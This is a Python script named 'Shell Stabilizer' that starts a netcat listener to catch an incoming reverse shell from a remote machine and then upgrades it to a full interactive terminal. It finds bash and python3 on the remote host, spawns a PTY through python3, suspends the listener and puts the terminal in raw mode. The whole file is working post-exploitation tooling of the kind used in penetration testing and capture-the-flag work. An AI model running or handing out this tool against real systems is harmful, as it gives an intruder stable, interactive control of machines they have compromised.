#!/usr/bin/env python3
# Shell Stabilizer v.20220831
# Requires nc and pexpect for proper function
# You're welcome. -EtcSec

# Works Pop!_OS and Kali now
# Need to spend some time cleaning up and organizing
# ZSH doesn't preserve the PS1 across the pty.spawn
# > This causes some unwanted output on the screen (Line 70- expecting [token,'.'])
# Need to add more shell and upgrade host lookup options
# Can some kind of error detection be used to catch 'mishaps'?

try: import pexpect
except: print("\nStabilizer requires the pexpect module, please install it and try again.\n"); exit()

from subprocess import run
from os import system
from time import sleep
from sys import argv
from string import ascii_letters
from random import choice

listenerCmd = "nc -lvnp"    # The listener command to use
rTimeout = 20               # Response timeout value in seconds
rSleep = 0                  # Sleep between commands, is this even needed?
chkToken = ""               # Setup a "randomized" token
for i in range(16): chkToken += choice(ascii_letters)

# Grab some local syste enviroment things
termSize = run(['stty','size'], capture_output=True).stdout.decode().strip().split()
localBash = run(['which','bash'], capture_output=True).stdout.decode().strip()

# Programs to look for on the remote system
findShell = ['bash',]
findUpgrade = ['python3',]

# Command list, in order, to stabilize shell
puntList = [
f'PS1="{chkToken}"',
"Find_Stabilizer",
f'PS1="{chkToken}"',
"Kill_The_Echo",
"reset",
"export SHELL=bash",
"export TERM=xterm-256color",
f"stty rows {termSize[0]} columns {termSize[1]}",
r'PS1="\n\u@\h:\w\n> "',
"reset",
]

def stabilize():  # Setup to receive connection via listener
    rShell.expect(['received','connect'], timeout=10000)
    print("Future needs incoming IP:Port here...")
    print(f'Check Token is: {chkToken}')
    print("Attempting stabilization",end='',flush=True)
    sleep(1.5)      # A little time buffer, just in case

    for i in puntList:  # Run the "punt list" to stabilize the shell
        if i == "Find_Stabilizer":
            sendCmd(findMethod())
            continue
        if i == "Kill_The_Echo":
            killEcho()
            continue
        sendCmd(i)

def sendCmd(CMD): # Sends stabilizing commands & waits for "token" response
    try:
        rShell.sendline(CMD)
        rShell.expect([chkToken,'.'], timeout=rTimeout) # This makes a mess on the screen if ZSH
        sleep(rSleep)
    except:
        print("\nTimeout Reached; or somthing worse??\n")
        exit(1)
    print(".", end='', flush=True) # Visual indication of functionality

def findMethod(): # Find a method for stabilization // INCOMPLETE; needs more work
    # The "&& exit" at the end just tears down the call back shell on the way out
    shellPath = ""
    upgradePath = ""

    # Find Shell/Path on remote system, only checks /bin and /usr/bin for now
    for shell in findShell:
        rShell.sendline(f'which {shell}')
        response = rShell.expect([f'/bin/{shell}',f'/usr/bin/{shell}']) 
        if response == 0:
            shellPath = f'/bin/{shell}'
        elif response == 1:
            shellPath = f'/usr/bin/{shell}'
        else:
            continue

    # Find Upgrade/Path on remote system, only checks /bin and /usr/bin for now
    for upgrade in findUpgrade:
        rShell.sendline(f'which {upgrade}')
        response = rShell.expect([f'/bin/{upgrade}',f'/usr/bin/{upgrade}']) 
        if response == 0:
            upgradePath = f'/bin/{upgrade}'
        elif response == 1:
            upgradePath = f'/usr/bin/{upgrade}'
        else:
            continue

    # This needs to be an if-tree, in order of preference
    if "python3" in upgradePath:
        stabMethod = f"""{upgradePath} -c 'import pty;pty.spawn("{shellPath}")' && exit"""
    
    return stabMethod

def killEcho(): # Kill the echo
    # This block is messy, but works ;)
    # Can this be cleaned up by using pexpect.sendcontrol()?
    getPidCommand = "ps a -o pid,command"
    OUTPUT = run(getPidCommand.split(' '), capture_output=True)
    output = OUTPUT.stdout.decode().split('\n')
    
    for line in output: # Search system processes for the listener command to get it's PID
        if f"{listenerCmd} {listenerPort}" in line:
            PID = line.strip().split(' ')[0]
    system(f'kill -TSTP {PID}') # sleeps the listener process with SIGTSTP
    rShell.sendline("stty raw -echo")
    rShell.sendline("fg")

if __name__ == "__main__":
    # User input validation; requires one valid port number
    if len(argv) != 2:
        print("\nUsage: stabilizer.py <port_to_listen_on>\n"); exit(1)
    try:
        if int(argv[1]) >= 1 and int(argv[1]) <= 65535:
            listenerPort = int(argv[1])
        else:
            print("\nInvalid port number\n"); exit(1)
    except ValueError:
        print("\nInvalid port number\n"); exit(1)
    
    # Spawn a new shell, start the listener, and announce listening state
    rShell = pexpect.spawn(localBash)
    rShell.sendline(r'PS1="\n<No Echo Garbage Shell>\nPlease type exit press return to quit.\n> "')
    rShell.sendline(f'{listenerCmd} {listenerPort}')
    print("[-] Listening on port:",listenerPort)

    # Do the thing
    stabilize()
    rShell.interact(escape_character='\x1b') # [ESC] key will kill it and drop you out

    # Close the shell that was created and reset the mess that was made when we're done
    system('reset')
